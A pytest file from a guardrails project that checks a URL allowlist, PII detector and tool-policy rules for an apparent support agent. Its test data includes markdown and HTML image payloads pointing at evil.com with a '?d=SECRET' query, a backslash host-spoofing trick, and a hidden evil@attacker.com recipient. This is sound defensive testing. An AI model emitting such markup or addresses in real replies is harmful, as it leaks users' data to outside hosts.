# path: book/projects/guardrails/tests/test_hardening.py
"""Bypass forms the main suites do not reach: backslashes, HTML attributes, line breaks, address lists."""
from __future__ import annotations

import pytest

from aie_core.llm.types import ToolCall
from guardrails import Action, GuardrailPipeline, Stage, Subject, ToolPolicyCheck, UrlAllowlistCheck, detect_pii
from guardrails.presets import support_tool_rules

HOSTS = ("intranet.northwind.example",)


@pytest.mark.parametrize("text", [
    "![x](https://evil.com\\@intranet.northwind.example/p.png)",
    "![x](//evil.com/p.png 'title')",
    "![x](//evil.com/p.png (title))",
    "![a [b] c](//evil.com/p.png)",
    '<img data-src="https://intranet.northwind.example/a" src="//evil.com/p.png?d=SECRET">',
    '<img alt="src=https://intranet.northwind.example/" src=//evil.com/p.png>',
    '<img srcset="//evil.com/p.png 1x">',
    '<a href="//evil.com/x">click',
    "see //evil.com/p?d=1",
])
def test_off_allowlist_targets_are_removed(text, ctx):
    v = UrlAllowlistCheck(HOSTS).evaluate(Subject(Stage.OUTPUT, text=text), ctx)
    assert v.action is not Action.ALLOW and "evil.com" not in (v.redacted or ""), v


@pytest.mark.parametrize("text", ["mid = (lo + hi)//2", "![ok](https://intranet.northwind.example/a.png 'Logo')",
                                  '<img src="https://intranet.northwind.example/a.png">'])
def test_allowlisted_and_non_url_text_is_left_alone(text, ctx):
    assert UrlAllowlistCheck(HOSTS).evaluate(Subject(Stage.OUTPUT, text=text), ctx).action is Action.ALLOW


@pytest.mark.parametrize("body", ["Hi\nAKIAIOSFODNN7EXAMPLE", "Hi\n555-123-4567", "Hi\n(555) 123-4567"])
def test_a_line_break_does_not_hide_secrets_or_pii(body, ctx):
    args = {"ticket_id": "TCK-2026-0001", "to": "jane@northwind.example", "subject": "s", "body": body}
    pipe = GuardrailPipeline([ToolPolicyCheck(support_tool_rules(require_send_approval=False))])
    assert not pipe.check_tool(ToolCall(id="c", name="send_reply", arguments=args), ctx).allowed


def test_a_recipient_list_cannot_hide_an_outside_address(ctx):
    args = {"ticket_id": "TCK-2026-0001", "to": "evil@attacker.com,bob@northwind.example", "subject": "s", "body": "b"}
    pipe = GuardrailPipeline([ToolPolicyCheck(support_tool_rules())])
    assert not pipe.check_tool(ToolCall(id="c", name="draft_reply", arguments=args), ctx).allowed


@pytest.mark.parametrize("text,kind", [("ref-4111111111111111", "card"), ("4111.1111.1111.1111", "card"),
                                       ("4111  1111 1111 1111", "card"), ("+33 1 23 45 67 89", "phone")])
def test_pii_formats_seen_in_the_wild(text, kind):
    assert kind in {m.kind for m in detect_pii(text)}


@pytest.mark.parametrize("text", ["196.197.1.179 115.69.185.206", "227.35 33.78 96.38 740.05"])
def test_ips_and_amounts_are_not_joined_into_a_card(text):
    assert "card" not in {m.kind for m in detect_pii(text)}


def test_a_data_attribute_that_is_not_a_url_is_ignored(ctx):
    text = '<img src="https://intranet.northwind.example/a.png" data-x="10:30">'
    assert UrlAllowlistCheck(HOSTS).evaluate(Subject(Stage.OUTPUT, text=text), ctx).action is Action.ALLOW


def test_measurement_scores_a_crashing_check_by_its_fail_mode():
    from guardrails.eval.datasets import input_cases
    from guardrails.eval.measure import measure_check
    from guardrails.pipeline import FailMode

    class Broken:
        name, fail_mode = "broken", FailMode.OPEN

        def evaluate(self, subject, ctx):
            raise RuntimeError("boom")

    cases = input_cases()
    m = measure_check(Broken(), cases)
    assert m.bypasses == m.n_attack and m.false_positives == 0 and len(m.error_ids) == len(cases)
